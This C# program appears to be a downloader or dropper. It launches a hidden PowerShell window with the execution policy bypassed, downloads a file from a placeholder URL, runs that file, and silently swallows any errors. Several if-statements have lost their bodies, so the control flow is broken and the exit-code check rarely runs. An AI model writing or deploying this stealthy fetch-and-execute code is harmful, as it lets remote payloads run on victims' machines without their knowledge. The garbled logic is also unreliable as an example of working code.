using System;
using System.Diagnostics;
using System.IO;

class Program
{
    static void Main()
    {
        string url = "Link";
        string path = @"path";

        try
        {
           
           
            string psCommand = $"Invoke-WebRequest -Uri \"{url}\" -OutFile \"{path}\" -UseBasicParsing";

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{psCommand}\"",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(psi))
            {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                
                if (!string.IsNullOrEmpty(output))

                if (!string.IsNullOrEmpty(error))
                    

                if (process.ExitCode != 0)
                {
                   
                    return;
                }
            }

           
            if (!File.Exists(path))
            {
                
                return;
            }

            

            
            Process.Start(path);
  
        }
        catch (Exception ex)
        {
            
        }

       
    }
}